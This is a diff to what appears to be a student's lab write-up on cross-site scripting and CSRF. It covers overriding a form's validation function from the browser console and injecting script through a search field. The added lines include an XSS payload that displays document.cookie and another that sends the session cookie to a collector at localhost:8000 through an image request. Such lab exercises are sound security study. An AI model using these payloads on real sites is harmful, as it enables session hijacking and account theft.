@@ -28,7 +28,6 @@ In browser console, I typed `allow pasting`
 Then I wrote in console the new `validate()` function that I want to execute
 ``` 
 function validate() {
-    alert("Custom validation logic executed!");
     return true; // Always allow the form submission
 }
 ```
@@ -46,3 +45,11 @@ Then, I want to show an alert to the user, so in the search field, I type
 ![5](5.png)
 
 So this approach can work to inject anything else
+
+I want to inject a script thta gives me the session token:
+[Inspiration from lab 3](./WS3_%20XSS%20_%20CSRF.pdf)
+
+```"><script>alert(document.cookie)</script>```
+```
+<script>var i=new Image(); i.src="http://localhost:8000/?"+document.cookie;</script>
+```
